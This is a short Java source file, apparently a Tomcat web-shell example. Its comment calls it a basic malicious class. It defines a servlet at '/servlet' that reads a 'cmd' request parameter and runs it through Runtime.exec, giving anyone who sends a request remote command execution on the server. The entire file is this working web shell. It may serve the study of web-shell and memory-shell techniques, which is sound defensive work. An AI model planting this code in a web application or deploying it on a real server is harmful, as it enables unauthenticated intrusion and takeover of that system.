package tomcatShell.Servlet;

import javax.servlet.*;
import javax.servlet.annotation.WebServlet;
import java.io.IOException;

// 基础恶意类
@WebServlet("/servlet")
public class ServletTest implements Servlet {
    @Override
    public void init(ServletConfig config) throws ServletException {

    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
        String cmd = req.getParameter("cmd");
        if (cmd !=null){
            try{
                Runtime.getRuntime().exec(cmd);
            }catch (IOException e){
                e.printStackTrace();
            }catch (NullPointerException n){
                n.printStackTrace();
            }
        }
    }

    @Override
    public String getServletInfo() {
        return null;
    }

    @Override
    public void destroy() {

    }
}